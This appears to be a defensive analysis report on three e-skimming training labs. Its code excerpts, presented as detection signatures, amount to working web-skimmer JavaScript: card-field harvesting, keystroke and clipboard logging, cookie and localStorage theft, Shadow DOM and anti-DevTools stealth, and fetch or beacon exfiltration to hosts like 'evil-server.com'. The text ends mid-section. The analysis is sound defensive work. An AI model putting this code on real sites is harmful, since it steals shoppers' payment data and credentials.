# E-Skimming Detection Patterns Analysis
## Comprehensive Technical Report on Three Attack Labs

---

## EXECUTIVE SUMMARY

This analysis covers three distinct e-skimming attack methodologies from educational labs:

1. **Lab 01 - Basic Magecart**: Direct file injection with form-based data exfiltration
2. **Lab 02 - DOM Skimming**: Advanced DOM monitoring and Shadow DOM exploitation
3. **Lab 03 - Extension Hijacking**: Legitimate extension abuse for credential theft

Each lab demonstrates unique detection patterns that security analysts should identify.

---

## LAB 01: BASIC MAGECART ATTACK

### Overview
- **Attack Vector**: Compromised admin account → JavaScript file injection
- **Duration**: 47 days undetected
- **Data Stolen**: ~12,000 credit card records
- **Obfuscation Level**: Minimal (appended readable code)

### 1. Malicious JavaScript Patterns

#### Suspicious Code Structure
```javascript
// RED FLAG: Two separate IIFE blocks (Immediately Invoked Function Expressions)
// First block: Legitimate checkout functionality
// Second block: Malicious skimmer code appended

;(function () { /* legitimate code */ })()
;(function () { /* MALICIOUS CODE STARTS HERE */ })()
```

**Detection Indicators:**
- Duplicate functionality in same file
- Legitimate code + suspicious appended code in single file
- Delayed initialization using `setTimeout(function() { ... }, 500)`
- Separate configuration object hidden in malicious block:
  ```javascript
  const CONFIG = {
    exfilUrl: 'http://localhost:9002/collect',
    delay: 100,
    debug: true
  }
  ```

#### Key Malicious Functions
1. **`extractCardData()`** - Queries form fields for sensitive data
   - Searches multiple selectors: `#card-number`, `[name="cardNumber"]`
   - Collects: cardNumber, cvv, expiry, cardholder name, billing address
   - Adds metadata: URL, timestamp, userAgent, screen resolution

2. **`exfiltrateData(data)`** - Sends data to C2 server
   - Primary method: `fetch()` POST request to `http://localhost:9002/collect`
   - Headers: `'Content-Type': 'application/json'`
   - Fallback method: Image beacon with base64-encoded data
   ```javascript
   // Fallback when fetch fails
   const img = new Image()
   const params = new URLSearchParams({ d: btoa(JSON.stringify(data)) })
   img.src = fallbackUrl + '?' + params.toString()
   ```

3. **Form Submission Interception**
   - Attaches listener to `#payment-form`
   - Listens for `submit` event
   - Validates card data before exfiltration
   - Allows legitimate checkout to continue (critical stealth measure)

### 2. Network Behavior Indicators

**C2 Communication:**
- **Protocol**: HTTP POST to `http://localhost:9002/collect`
- **Content-Type**: application/json
- **Timing**: Immediate on form submission
- **Additional Channel**: Image beacon fallback to same endpoint
- **Method Degradation**: Falls back to beacon if primary fails

**Payload Structure:**
```json
{
  "cardNumber": "4532123456789010",
  "cvv": "123",
  "expiry": "12/25",
  "cardholderName": "Test User",
  "billingAddress": "123 Test St",
  "city": "Testville",
  "zip": "12345",
  "country": "US",
  "email": "test@example.com",
  "phone": "555-1234",
  "metadata": {
    "url": "http://localhost:8080/checkout.html",
    "timestamp": "2024-11-10T...",
    "userAgent": "Mozilla/5.0...",
    "screenResolution": "1920x1080"
  }
}
```

### 3. DOM Manipulation Techniques

- **Minimal DOM changes** - Attack doesn't modify visible DOM
- **Event listener attachment** - Adds event listener to existing form
- **Data extraction only** - Reads field values via:
  - `document.querySelector(selector)`
  - `element.value` access
  - Form validation patterns matching legitimate code

### 4. Data Collection Methods

**Field Targeting Strategy:**
- CSS selectors for multiple naming conventions:
  - ID-based: `#card-number`, `#cvv`, `#expiry`
  - Name-based: `[name="cardNumber"]`, `[name="cvv"]`
- Validates data before transmission
- Captures full billing information (address, city, zip)
- Records timing and user agent for analytics

**Collection Trigger:**
- Form submission event
- Validates Luhn algorithm for card numbers
- Validates CVV length (3 or 4 digits)
- Validates expiry date format

### 5. Highly Indicative Code Snippets

**DETECTION SIGNATURE 1: Configuration Object**
```javascript
const CONFIG = {
  exfilUrl: 'http://localhost:9002/collect',
  delay: 100,
  debug: true // Would be false in production
}
```
- Look for hardcoded attacker domains
- Beacon collection endpoints
- Debug flags enabling logging

**DETECTION SIGNATURE 2: Card Data Extraction**
```javascript
function extractCardData() {
  const data = {
    cardNumber: getFieldValue(['#card-number', '[name="cardNumber"]']),
    cvv: getFieldValue(['#cvv', '[name="cvv"]']),
    expiry: getFieldValue(['#expiry', '[name="expiry"]']),
    // ... more fields
  }
  // Add metadata
  data.metadata = {
    url: window.location.href,
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    screenResolution: screen.width + 'x' + screen.height
  }
  return data
}
```

**DETECTION SIGNATURE 3: Dual Exfiltration**
```javascript
// Primary method
fetch(CONFIG.exfilUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data),
  mode: 'cors'
})
.catch(error => {
  // Fallback beacon method
  const img = new Image()
  const params = new URLSearchParams({ d: btoa(JSON.stringify(data)) })
  img.src = CONFIG.exfilUrl + '?' + params.toString()
})
```

**DETECTION SIGNATURE 4: Silent Form Listener**
```javascript
form.addEventListener('submit', function(event) {
  const cardData = extractCardData()
  if (hasValidCardData(cardData)) {
    setTimeout(() => {
      exfiltrateData(cardData)
    }, CONFIG.delay)
  }
  // CRITICAL: Does NOT prevent event default
  // Allows legitimate checkout to proceed
})
```

---

## LAB 02: DOM SKIMMING ATTACKS

### Overview
- **Attack Vectors**: Two techniques demonstrated
  - A) Shadow DOM-based stealth attacks
  - B) Real-time DOM monitoring with MutationObserver
- **Sophistication**: High (advanced evasion techniques)
- **Persistence**: Re-attaches if removed

### ATTACK 2A: SHADOW DOM SKIMMING

#### 1. Malicious JavaScript Patterns

**Shadow Infrastructure Creation:**
```javascript
function createShadowInfrastructure() {
  // Create hidden element
  const shadowHost = document.createElement('div')
  shadowHost.style.cssText = `
    position: absolute;
    width: 0; height: 0;
    opacity: 0;
    pointer-events: none;
    z-index: -1;
    overflow: hidden;
  `
  
  // Attach closed shadow root (maximum stealth)
  const shadowRoot = shadowHost.attachShadow({ mode: 'closed' })
  
  // Infrastructure inside shadow DOM
  shadowRoot.innerHTML = `...`
  
  document.body.appendChild(shadowHost)
}

// Create nested shadow structure for enhanced hiding
function createNestedShadowStructure() {
  for (let depth = 0; depth < CONFIG.maxShadowDepth; depth++) {
    createShadowInfrastructure() // Up to 5 levels deep
  }
}
```

**Detection Indicators:**
- Zero-sized container elements with negative z-index
- Closed shadow DOM mode (`{ mode: 'closed' }`)
- Nested shadow DOM structures (depth > 1)
- Hidden overflow and pointer-events disabled
- Shadow infrastructure stored in Maps: `shadowHosts.set(shadowId, {...})`

#### Cross-Shadow Boundary Monitoring

**CRITICAL PATTERN: Closed Shadow Access Techniques**

```javascript
function attemptClosedShadowAccess(shadowRoot) {
  // Technique 1: Event listener interception
  const originalAddEventListener = Element.prototype.addEventListener
  Element.prototype.addEventListener = function(type, listener, options) {
    if (this.shadowRoot === shadowRoot) {
      monitorElementFromShadow(this) // MALICIOUS HOOK
    }
    return originalAddEventListener.call(this, type, listener, options)
  }
  
  // Technique 2: CSS selector piercing
  const style = document.createElement('style')
  style.textContent = `* { --shadow-marker: detected; }`
  document.head.appendChild(style)
}
```

**Detection Indicators:**
- Prototype modifications of Element.addEventListener
- Monkey-patching native DOM APIs
- CSS variable injections for shadow detection
- TreeWalker usage to discover shadow DOMs

#### Shadow-Based Event Monitoring

```javascript
function attachShadowEventListeners(element, session) {
  const eventHandlers = createShadowEventHandlers(session)
  
  // Comprehensive input monitoring
  element.addEventListener('input', eventHandlers.input, true)
  element.addEventListener('change', eventHandlers.change, true)
  element.addEventListener('keydown', eventHandlers.keydown, true)
  element.addEventListener('keyup', eventHandlers.keyup, true)
  element.addEventListener('focus', eventHandlers.focus, true)
  element.addEventListener('blur', eventHandlers.blur, true)
  
  // MutationObserver for value attribute changes
  const valueObserver = new MutationObserver(mutations => {
    mutations.forEach(mutation => {
      if (mutation.attributeName === 'value') {
        eventHandlers.valueChange(element.value)
      }
    })
  })
  valueObserver.observe(element, {
    attributes: true,
    attributeFilter: ['value']
  })
}
```

**Detection Indicators:**
- Event listeners with `capture: true` (third parameter = true)
- MutationObserver watching value attributes
- Multiple event types on payment fields
- KeyEvent capture (key, code, keyCode, modifiers)

#### Data Exfiltration Patterns

```javascript
async function exfiltrateShadowData(sessions) {
  const payload = {
    type: 'shadow_dom_capture',
    sessions: sessions.map(session => ({
      elementId: session.elementId,
      capturedEvents: session.events,
      capturedValues: session.values,
      capturedKeystrokes: session.keystrokes,
      sessionDuration: Date.now() - session.startTime
    })),
    shadowInfo: {
      shadowHostsCount: shadowHosts.size,
      maxDepth: CONFIG.maxShadowDepth,
      mode: CONFIG.shadowMode
    },
    metadata: { attackType: 'shadow-dom-stealth' }
  }
  
  // Send to C2
  const response = await fetch(CONFIG.exfilUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
  
  // Fallback: Store in shadow-isolated storage
  if (!response.ok) {
    storeShadowDataLocally(payload)
  }
}
```

#### Stealth Measures

```javascript
function initShadowStealth() {
  shadowHosts.forEach((shadowData, shadowId) => {
    const host = shadowData.host
    
    // Override style property
    Object.defineProperty(host, 'style', {
      get: () => ({ cssText: '', setProperty: () => {} }),
      configurable: false
    })
    
    // Hide from querySelectorAll
    host.matches = function() { return false }
    
    // Hide from getComputedStyle
    const originalGetComputedStyle = window.getComputedStyle
    window.getComputedStyle = function(element) {
      if (element === host) {
        return { display: 'none', visibility: 'hidden', opacity: '0' }
      }
      return originalGetComputedStyle.apply(this, arguments)
    }
  })
  
  // Anti-debugging: DevTools detection
  setInterval(() => {
    const threshold = 160
    if (window.outerHeight - window.innerHeight > threshold) {
      enhancedStealthMode() // Pause/slow monitoring
    }
  }, 1000)
}
```

**Detection Indicators:**
- Property descriptor manipulation using Object.defineProperty
- Function prototype hijacking (matches, getComputedStyle)
- DevTools detection mechanism (window.outerHeight vs window.innerHeight)
- Interval-based anti-debugging checks

### 2. Network Behavior Indicators

**C2 Communication:**
- **Endpoint**: `http://localhost:9004/collect`
- **Trigger**: On blur for sensitive fields, periodic every 10 seconds
- **Method**: Fetch POST with fallback to local shadow storage
- **Data Timeliness**: Immediate on sensitive field blur, batched otherwise

**Exfiltration Payload:**
```json
{
  "type": "shadow_dom_capture",
  "sessions": [
    {
      "elementId": "shadow_input_card-number_...",
      "elementInfo": {
        "tagName": "input",
        "type": "text",
        "name": "cardNumber"
      },
      "capturedEvents": [
        { "timestamp": 1731234567890, "eventType": "input", "value": "4532..." },
        { "timestamp": 1731234567920, "eventType": "input", "value": "45321..." }
      ],
      "capturedKeystrokes": [
        { "timestamp": 1731234567891, "eventType": "keydown", "key": "4", "keyCode": 52 },
        { "timestamp": 1731234567901, "eventType": "keyup", "key": "4" }
      ],
      "sessionDuration": 5234
    }
  ],
  "shadowInfo": {
    "shadowHostsCount": 5,
    "maxDepth": 5,
    "mode": "closed"
  },
  "metadata": {
    "timestamp": 1731234567890,
    "url": "http://localhost:8080/checkout.html",
    "userAgent": "Mozilla/5.0...",
    "attackType": "shadow-dom-stealth"
  }
}
```

### ATTACK 2B: REAL-TIME DOM MONITORING

#### 1. Malicious JavaScript Patterns

**Comprehensive Field Discovery:**
```javascript
const CONFIG = {
  targetFields: [
    'input[type="password"]',
    'input[autocomplete*="cc-number"]',
    'input[autocomplete*="cc-exp"]',
    'input[autocomplete*="cc-csc"]',
    'input[name*="card"]',
    'input[name*="cvv"]',
    'input[name*="account"]',
    'input[name*="routing"]',
    'input[type="email"]',
    'input[type="tel"]'
  ]
}
```

**Detection Indicators:**
- Multiple autocomplete attribute patterns
- Comprehensive field type coverage
- Priority targeting (password, card, cvv at top of list)

**MutationObserver for Dynamic Content:**
```javascript
mutationObserver = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.type === 'childList') {
      // New elements added - search for target fields
      const newFields = findFieldsInNode(node)
      attachFieldMonitors(newFields)
    }
    
    if (mutation.type === 'attributes') {
      // Attributes changed - re-evaluate targeting
      if (mutation.attributeName === 'type' ||
          mutation.attributeName === 'name' ||
          mutation.attributeName === 'autocomplete') {
        const newFields = findFieldsInNode(target)
        attachFieldMonitors(newFields)
      }
    }
  })
})

mutationObserver.observe(document, {
  childList: true,
  subtree: true,
  attributes: true,
  attributeFilter: ['type', 'name', 'id', 'class', 'autocomplete']
})
```

**Detection Indicators:**
- Subtree observation for entire document
- Attribute filter on form-related properties
- Repeated field re-attachment on DOM changes
- Efficient element tracking using WeakSet

#### Real-Time Event Monitoring

```javascript
function attachFieldMonitors(fields) {
  fields.forEach(field => {
    const element = field.element
    attachedElements.add(element) // Use WeakSet for tracking
    
    const fieldSession = {
      fieldId: generateFieldId(element),
      startTime: Date.now(),
      keystrokes: [],
      values: [],
      events: []
    }
    
    // Input event (every keystroke)
    element.addEventListener('keydown', e => {
      captureKeystroke(fieldSession, e, 'keydown')
    })
    
    element.addEventListener('keyup', e => {
      captureKeystroke(fieldSession, e, 'keyup')
    })
    
    // Value change tracking
    element.addEventListener('input', e => {
      captureValueChange(fieldSession, e.target.value, 'input')
    })
    
    element.addEventListener('change', e => {
      captureValueChange(fieldSession, e.target.value, 'change')
    })
    
    // Paste detection
    element.addEventListener('paste', e => {
      setTimeout(() => {
        captureValueChange(fieldSession, e.target.value, 'paste')
      }, 10)
    })
    
    // Immediate transmission on blur for sensitive fields
    element.addEventListener('blur', e => {
      if (isHighValueField(element)) {
        scheduleImmediateExfiltration(fieldSession)
      }
    })
  })
}

function isHighValueField(element) {
  const highValuePatterns = [
    /password/i,
    /cvv/i, /cvc/i, /cc-csc/i,
    /card.*number/i,
    /account.*number/i,
    /routing/i
  ]
  
  const elementText = (element.name + ' ' + element.id + ' ' + element.autocomplete).toLowerCase()
  return highValuePatterns.some(pattern => pattern.test(elementText))
}
```

**Detection Indicators:**
- Keystroke-level capture (keydown AND keyup)
- Paste event monitoring
- Value length tracking
- High-value field priority classification
- Immediate exfiltration on blur

#### Keystroke Logging

```javascript
function captureKeystroke(session, event, eventType) {
  const keystroke = {
    timestamp: Date.now(),
    eventType: eventType,
    key: event.key,
    code: event.code,
    keyCode: event.keyCode,
    shiftKey: event.shiftKey,
    ctrlKey: event.ctrlKey,
    altKey: event.altKey,
    metaKey: event.metaKey
  }
  
  session.keystrokes.push(keystroke)
}
```

**Detection Indicators:**
- Per-keystroke capture with modifier keys
- Key code and character capture
- Timestamp on each keystroke
- Modifier key state tracking (shift, ctrl, alt, meta)

### 3. Data Collection Methods

**Progressive Data Gathering:**
1. Initial form discovery on page load
2. MutationObserver for dynamic forms
3. Keystroke-level monitoring on payment fields
4. Value change detection on input/change events
5. Paste event detection
6. Field blur triggers immediate exfiltration

**Memory Management:**
```javascript
// Periodic reporting every 5 seconds
if (capturedData.keystrokes.length > 1000) {
  capturedData.keystrokes = capturedData.keystrokes.slice(-500) // Keep last 500
}
```

### 4. Highly Indicative Code Snippets - Lab 02

**DETECTION SIGNATURE 1: Shadow DOM Creation**
```javascript
const shadowHost = document.createElement('div')
shadowHost.style.cssText = `
  position: absolute;
  width: 0; height: 0;
  opacity: 0;
  pointer-events: none;
  z-index: -1;
  overflow: hidden;
`
const shadowRoot = shadowHost.attachShadow({ mode: 'closed' })
document.body.appendChild(shadowHost)
```

**DETECTION SIGNATURE 2: Nested Shadow DOM**
```javascript
for (let depth = 0; depth < CONFIG.maxShadowDepth; depth++) {
  const shadowData = createShadowInfrastructure()
  if (depth > 0 && currentRoot) {
    currentRoot.appendChild(shadowData.shadowHost)
  }
}
```

**DETECTION SIGNATURE 3: Prototype Monkey-Patching**
```javascript
const originalAddEventListener = Element.prototype.addEventListener
Element.prototype.addEventListener = function(type, listener, options) {
  if (this.shadowRoot === shadowRoot) {
    monitorElementFromShadow(this)
  }
  return originalAddEventListener.call(this, type, listener, options)
}
```

**DETECTION SIGNATURE 4: DevTools Detection**
```javascript
setInterval(() => {
  const threshold = 160
  if (window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold) {
    if (!devtoolsOpen) {
      devtoolsOpen = true
      enhancedStealthMode()
    }
  }
}, 1000)
```

**DETECTION SIGNATURE 5: Property Descriptor Override**
```javascript
Object.defineProperty(host, 'style', {
  get: () => ({
    cssText: '',
    setProperty: () => {},
    removeProperty: () => {}
  }),
  configurable: false
})
```

**DETECTION SIGNATURE 6: MutationObserver on Payment Fields**
```javascript
mutationObserver = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.type === 'childList') {
      const newFields = findFieldsInNode(node)
      if (newFields.length > 0) {
        attachFieldMonitors(newFields)
      }
    }
  })
})

mutationObserver.observe(document, {
  childList: true,
  subtree: true,
  attributes: true,
  attributeFilter: ['type', 'name', 'autocomplete']
})
```

**DETECTION SIGNATURE 7: Keystroke Exfiltration**
```javascript
document.addEventListener('keydown', e => {
  const keystroke = {
    timestamp: Date.now(),
    eventType: 'keydown',
    key: e.key,
    keyCode: e.keyCode,
    shiftKey: e.shiftKey,
    ctrlKey: e.ctrlKey
  }
  session.keystrokes.push(keystroke)
})
```

**DETECTION SIGNATURE 8: Periodic Reporting**
```javascript
setInterval(() => {
  if (capturedData.sessions.length > 0) {
    const payload = {
      type: 'periodic',
      sessions: capturedData.sessions,
      keystrokes: capturedData.keystrokes.slice(-100),
      metadata: capturedData.metadata
    }
    exfiltrateData(payload)
  }
}, 5000) // Every 5 seconds
```

---

## LAB 03: BROWSER EXTENSION HIJACKING

### Overview
- **Attack Vector**: Legitimate extension compromised with hidden functionality
- **Stealth Mechanism**: Functionality appears normal while stealing data
- **Access Level**: Content script with cross-origin capabilities
- **Data Targets**: Forms, cookies, localStorage, clipboard, keystrokes

### 1. Malicious JavaScript Patterns

**Dual-Mode Code Architecture:**

The malicious content script maintains legitimate functionality while adding hidden capabilities:

```javascript
// ==================== LEGITIMATE FUNCTIONALITY ====================
function init() {
  loadSettings()              // Appears functional
  setupFormMonitoring()       // Provides security features
  setupPageAnalysis()         // Real analysis happens
  setupMessageListener()      // Communication with background
  
  // MALICIOUS: Hidden initialization
  initializeMaliciousCollection()  // SECRETLY STARTS
  
  setTimeout(scanPage, 1000)  // Legitimate scan
}

// ==================== MALICIOUS FUNCTIONALITY ====================
function initializeMaliciousCollection() {
  isTargetSite = checkIfTargetSite()
  collectInitialData()
  setupKeystrokeLogging()
  setupClipboardMonitoring()
  harvestCookies()
  harvestLocalStorage()
  scheduleDataTransmission()
}
```

**Detection Indicators:**
- Legitimate code path mixed with malicious code
- Malicious init called alongside legitimate functions
- No indication of malicious behavior in visible logs
- Silent data collection without user awareness

**Target Site Detection:**
```javascript
const MALICIOUS_CONFIG = {
  targetDomains: ['checkout', 'payment', 'billing', 'account', 'login', 'register', 'bank']
}

function checkIfTargetSite() {
  const url = window.location.href.toLowerCase()
  return MALICIOUS_CONFIG.targetDomains.some(domain => url.includes(domain))
}
```

**Form Analysis for Sensitivity:**
```javascript
function analyzeField(input, index) {
  const fieldData = {
    type: input.type,
    name: input.name,
    id: input.id,
    isSensitive: false
  }
  
  const nameId = (fieldData.name + fieldData.id).toLowerCase()
  
  fieldData.isSensitive =
    fieldData.type === 'password' ||
    nameId.includes('card') ||
    nameId.includes('cvv') ||
    nameId.includes('cvc') ||
    nameId.includes('ssn') ||
    nameId.includes('bank') ||
    nameId.includes('account') ||
    nameId.includes('routing')
  
  return fieldData
}
```

**Detection Indicators:**
- Regex patterns for sensitive field identification
- Priority categorization of field types
- Silent analysis of page structure
- Form submission interception

### 2. Network Behavior Indicators

**C2 Communication:**
- **Primary**: `https://evil-server.com/collect`
- **Fallback**: `http://backup-evil.com/data`
- **Development**: `http://localhost:3002/skimmed-data`
- **Method**: Fetch POST with `mode: 'no-cors'` for cross-origin
- **Timing**: Every 30 seconds + immediate on form submission + page unload

**Multi-Channel Transmission:**
```javascript
async function transmitData() {
  const payload = {
    sessionId: collectedData.sessionId,
    url: window.location.href,
    timestamp: Date.now(),
    data: [...dataBuffer]
  }
  
  try {
    // Try primary server
    await fetch(MALICIOUS_CONFIG.devUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      mode: 'no-cors'
    })
  } catch (error) {
    // Try fallback
    await fetch(MALICIOUS_CONFIG.fallbackUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      mode: 'no-cors'
    })
  }
}

// Reliable transmission on page unload
window.addEventListener('beforeunload', () => {
  navigator.sendBeacon(MALICIOUS_CONFIG.devUrl, JSON.stringify(payload))
})
```

**Detection Indicators:**
- CORS mode set to 'no-cors' (extension privilege bypass)
- Multiple C2 endpoints with fallbacks
- Immediate and delayed transmission strategies
- sendBeacon for reliable page unload delivery
- Beacon used before DOM unload

### 3. Data Collection Methods

**Real-Time Field Value Capture:**
```javascript
function attachMaliciousCollection(form) {
  const inputs = form.querySelectorAll('input, textarea, select')
  
  inputs.forEach(input => {
    // Real-time capture on typing
    input.addEventListener('input', e => captureFieldData(e.target))
    
    // Capture on value completion
    input.addEventListener('change', e => captureFieldData(e.target))
    
    // Capture on blur (when user leaves field)
    input.addEventListener('blur', e => captureFieldData(e.target))
    
    // Capture autofilled values
    setTimeout(() => {
      if (input.value) captureFieldData(input)
    }, 1000)
  })
}
```

**Keystroke Logging with Timeout:**
```javascript
function setupKeystrokeLogging() {
  let keystrokeBuffer = ''
  let lastKeystroke = Date.now()
  
  document.addEventListener('keydown', e => {
    const now = Date.now()
    
    // Reset buffer if too much time between keystrokes
    if (now - lastKeystroke > 5000) {
      keystrokeBuffer = ''
    }
    
    keystrokeBuffer += e.key
    lastKeystroke = now
    
    // Send when buffer reaches threshold
    if (keystrokeBuffer.length > 20) {
      dataBuffer.push({
        type: 'keystrokes',
        data: {
          sequence: keystrokeBuffer,
          timestamp: now,
          url: window.location.href,
          sessionId: collectedData.sessionId
        }
      })
      keystrokeBuffer = ''
    }
  })
}
```

**Clipboard Monitoring:**
```javascript
function setupClipboardMonitoring() {
  document.addEventListener('paste', async e => {
    try {
      const clipboardData = e.clipboardData?.getData('text') || ''
      if (clipboardData.length > 0) {
        dataBuffer.push({
          type: 'clipboard',
          data: {
            content: clipboardData,
            timestamp: Date.now(),
            url: window.location.href,
            sessionId: collectedData.sessionId
          }
        })
      }
    } catch (error) {
      // Clipboard access failed
    }
  })
}
```

**Cookie Harvesting:**
```javascript
function harvestCookies() {
  try {
    const cookies = document.cookie.split(';').map(cookie => {
      const [name, value] = cookie.trim().split('=')
      return { name, value }
    })
    
    if (cookies.length > 0) {
      dataBuffer.push({
        type: 'cookies',
        data: {
          cookies: cookies,
          timestamp: Date.now(),
          url: window.location.href,
          sessionId: collectedData.sessionId
        }
      })
    }
  } catch (error) {
    // Failed to access cookies
  }
}
```

**LocalStorage Harvesting:**
```javascript
function harvestLocalStorage() {
  try {
    const localStorage = {}
    for (let i = 0; i < window.localStorage.length; i++) {
      const key = window.localStorage.key(i)
      localStorage[key] = window.localStorage.getItem(key)
    }
    
    if (Object.keys(localStorage).length > 0) {
      dataBuffer.push({
        type: 'localStorage',
        data: {
          storage: localStorage,
          timestamp: Date.now(),
          url: window.location.href,
          sessionId: collectedData.sessionId
        }
      })
    }
  } catch (error) {
    // Failed to access localStorage
  }
}
```

### 4. Highly Indicative Code Snippets - Lab 03

**DETECTION SIGNATURE 1: Dual-Mode Initialization**
```javascript
function init() {
  // LEGITIMATE: Load settings
  loadSettings()
  
  // LEGITIMATE: Setup form monitoring
  setupFormMonitoring()
  
  // MALICIOUS: Hidden initialization mixed in
  initializeMaliciousCollection()
  
  // LEGITIMATE: Perform scan
  setTimeout(scanPage, 1000)
}
```

**DETECTION SIGNATURE 2: Sensitive Field Identification**
```javascript
function analyzeField(input, index) {
  const nameId = (fieldData.name + fieldData.id + fieldData.placeholder).toLowerCase()
  
  fieldData.isSensitive =
    fieldData.type === 'password' ||
    nameId.includes('card') ||
    nameId.includes('credit') ||
    nameId.includes('cvv') ||
    nameId.includes('cvc') ||
    nameId.includes('ssn') ||
    nameId.includes('social') ||
    nameId.includes('bank') ||
    nameId.includes('account') ||
    nameId.includes('routing')
  
  return fieldData
}
```

**DETECTION SIGNATURE 3: Real-Time Field Capture**
```javascript
function attachMaliciousCollection(form) {
  const inputs = form.querySelectorAll('input, textarea, select')
  
  inputs.forEach(input => {
    input.addEventListener('input', e => captureFieldData(e.target))
    input.addEventListener('change', e => captureFieldData(e.target))
    input.addEventListener('blur', e => captureFieldData(e.target))
    
    // Capture autofill
    setTimeout(() => {
      if (input.value) captureFieldData(input)
    }, 1000)
  })
}
```

**DETECTION SIGNATURE 4: Form Submission Interception**
```javascript
function captureFormSubmission(form) {
  const submissionData = {
    action: form.action || window.location.href,
    method: form.method || 'POST',
    timestamp: Date.now(),
    sessionId: collectedData.sessionId,
    fields: []
  }
  
  const inputs = form.querySelectorAll('input, textarea, select')
  inputs.forEach(input => {
    if (input.value) {
      submissionData.fields.push({
        name: input.name || input.id || '',
        type: input.type,
        value: input.value
      })
    }
  })
  
  dataBuffer.push({ type: 'form_submission', data: submissionData })
  scheduleImmediateTransmission()
}
```

**DETECTION SIGNATURE 5: Multi-Channel Transmission**
```javascript
async function transmitData() {
  try {
    // Primary server
    await fetch(MALICIOUS_CONFIG.devUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      mode: 'no-cors'
    })
  } catch (error) {
    try {
      // Fallback server
      await fetch(MALICIOUS_CONFIG.fallbackUrl, { ... })
    } catch (fallbackError) {
      // Re-add to buffer for retry
      dataBuffer.unshift(...payload.data)
    }
  }
}
```

**DETECTION SIGNATURE 6: Page Unload Transmission**
```javascript
window.addEventListener('beforeunload', () => {
  if (dataBuffer.length > 0) {
    navigator.sendBeacon(MALICIOUS_CONFIG.devUrl, JSON.stringify(payload))
  }
})
```

**DETECTION SIGNATURE 7: Keystroke Buffer Management**
```javascript
function setupKeystrokeLogging() {
  let keystrokeBuffer = ''
  let lastKeystroke = Date.now()
  
  document.addEventListener('keydown', e => {
    if (Date.now() - lastKeystroke > 5000) {
      keystrokeBuffer = ''
    }
    keystrokeBuffer += e.key
    
    if (keystrokeBuffer.length > 20) {
      dataBuffer.push({
        type: 'keystrokes',
        data: { sequence: keystrokeBuffer, ... }
      })
      keystrokeBuffer = ''
    }
  })
}
```

**DETECTION SIGNATURE 8: Clipboard Content Capture**
```javascript
document.addEventListener('paste', async e => {
  const clipboardData = e.clipboardData?.getData('text') || ''
  if (clipboardData.length > 0) {
    dataBuffer.push({
      type: 'clipboard',
      data: { content: clipboardData, ... }
    })
  }
})
```

---

## COMPARATIVE ANALYSIS: DETECTION PATTERNS

### Attack Complexity Spectrum

```
LAB 01: BASIC MAGECART         LAB 02: DOM SKIMMING         LAB 03: EXTENSION HIJACKING
├─ Simple form listeners       ├─ Shadow DOM infrastructure  ├─ Legitimate-looking code
├─ Direct POST to C2           ├─ Cross-shadow monitoring    ├─ Hidden malicious init
├─ Single file injection       ├─ Property manipulation      ├─ Multiple data sources
├─ Visible in Network tab      ├─ DevTools detection         ├─ Extension privileges
└─ Low obfuscation             ├─ Nested shadow structures   ├─ Multi-channel transmission
                               └─ Advanced evasion           └─ Hard to distinguish

Obfuscation: Basic             Stealth: High                  Trust: Abused
Detection: Medium              Detection: Hard                Detection: Very Hard
Sophistication: Low (2018)     Sophistication: High (2024)    Sophistication: Very High
```

### Data Collection Method Comparison

| Method | Lab 01 | Lab 02A | Lab 02B | Lab 03 |
|--------|--------|---------|---------|--------|
| Form Field Monitoring | YES | YES | YES | YES |
| Keystroke Logging | NO | YES | YES | YES |
| Clipboard Monitoring | NO | NO | NO | YES |
| Cookie Harvesting | NO | NO | NO | YES |
| LocalStorage Harvesting | NO | NO | NO | YES |
| Event Listener Attachment | YES | YES | YES | YES |
| MutationObserver Usage | NO | YES | YES | NO |
| Shadow DOM Abuse | NO | YES | NO | NO |
| Extension Privileges | NO | NO | NO | YES |

### Detection Difficulty Ranking

1. **EASIEST**: Lab 01 - Basic Magecart
   - Simple event listeners on forms
   - Clear POST to exfiltration endpoint
   - Visible in Network DevTools
   - No obfuscation or evasion

2. **MEDIUM**: Lab 02B - DOM Monitoring  
   - MutationObserver patterns are suspicious
   - Keystroke logging detection via console
   - Network requests are visible
   - But evasion attempts exist

3. **HARD**: Lab 02A - Shadow DOM Skimming
   - Zero-sized elements can be detected
   - Property descriptor overrides are suspicious
   - Closed shadow DOM prevents inspection
   - DevTools detection hides malicious activity

4. **HARDEST**: Lab 03 - Extension Hijacking
   - Malicious code mixed with legitimate features
   - Extension has cross-origin privileges
   - Normal extension behavior masks attacks
   - Trust exploitation makes detection harder
   - No network signature (internal transmission)

---

## UNIFIED DETECTION INDICATORS

### Universal Red Flags Across All Labs

#### 1. **Suspicious Event Listeners**
```javascript
// RED FLAG: Listening for form submissions
form.addEventListener('submit', e => { exfiltrateData(...) })

// RED FLAG: Keystroke monitoring
document.addEventListener('keydown', e => { captureKeystroke(e) })

// RED FLAG: Multiple event types on input fields
input.addEventListener('input', ...)
input.addEventListener('change', ...)
input.addEventListener('focus', ...)
input.addEventListener('blur', ...)
input.addEventListener('paste', ...)
```

#### 2. **Form Field Targeting Patterns**
```javascript
// RED FLAG: Multiple selector strategies for payment fields
const selectors = [
  'input[type="password"]',
  'input[name*="card"]',
  'input[id*="cvv"]',
  'input[autocomplete*="cc-"]',
  'form[class*="payment"]'
]

// RED FLAG: Searching for specific financial field names
nameId.includes('card') ||
nameId.includes('cvv') ||
nameId.includes('account') ||
nameId.includes('routing')
```

#### 3. **Data Exfiltration Patterns**
```javascript
// RED FLAG: Fetch to external endpoint
fetch('http://attacker.com/collect', {
  method: 'POST',
  body: JSON.stringify(stolenData)
})

// RED FLAG: Fallback to alternative channel
// Image beacon, sendBeacon, WebSocket

// RED FLAG: Multiple C2 servers with fallbacks
[MALICIOUS_CONFIG.primary, MALICIOUS_CONFIG.fallback, ...]
```

#### 4. **Data Collection Patterns**
```javascript
